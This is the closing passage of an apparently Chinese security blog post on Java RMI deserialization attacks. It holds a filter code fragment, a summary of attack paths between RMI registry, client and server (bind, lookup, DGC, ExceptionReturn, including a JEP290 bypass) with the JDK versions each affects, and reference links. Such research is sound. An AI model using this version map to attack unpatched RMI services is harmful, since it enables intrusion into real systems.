class="line">!var1.getName().equals(&quot;java.util.Collections$EmptyList&quot;) </span><br><span class="line">? Status.REJECTED : Status.ALLOWED;</span><br></pre></td></tr></table></figure>


<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>从以上分析中可以看到，JRMP这种基于序列化数据传输协议使得RMI注册中心、客户端、服务端都能互相攻击。一般来说，服务端和注册中心在同一主机上。</p>
<p><strong>注册中心/服务端</strong>对<strong>客户端</strong>的攻击:  </p>
<ul>
<li>2.2/3.2/4.2: ExceptionReturn</li>
<li>5.2: ExceptionReturn<ul>
<li>JDK&lt;8u232_b09</li>
</ul>
</li>
</ul>
<p><strong>客户端</strong>对<strong>注册中心/服务端</strong>的攻击:</p>
<ul>
<li>2.1: bind操作<ul>
<li>JDK&lt;8u121</li>
</ul>
</li>
<li>2.3: JEP290绕过的bind操作<ul>
<li>JDK&lt;8u232_b09</li>
</ul>
</li>
<li>3.1: lookup操作<ul>
<li>JDK&lt;8u121</li>
</ul>
</li>
<li>4.1: Object参数</li>
<li>5.1: DGC通信<ul>
<li>JDK&lt;8u232_b09</li>
</ul>
</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://xz.aliyun.com/t/6660" target="_blank" rel="noopener">RMI-反序列化</a></li>
<li><a href="https://paper.seebug.org/1194/" target="_blank" rel="noopener">JAVA RMI 反序列化知识详解</a></li>
<li><a href="https://xz.aliyun.com/t/2223" target="_blank" rel="noopener">JAVA RMI 反序列化流程原理分析</a></li>
<li><a href="https://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/" target="_blank" rel="noopener">浅谈Java RMI Registry安全问题</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>RMI</tag>
      </tags>
  </entry>
</search>
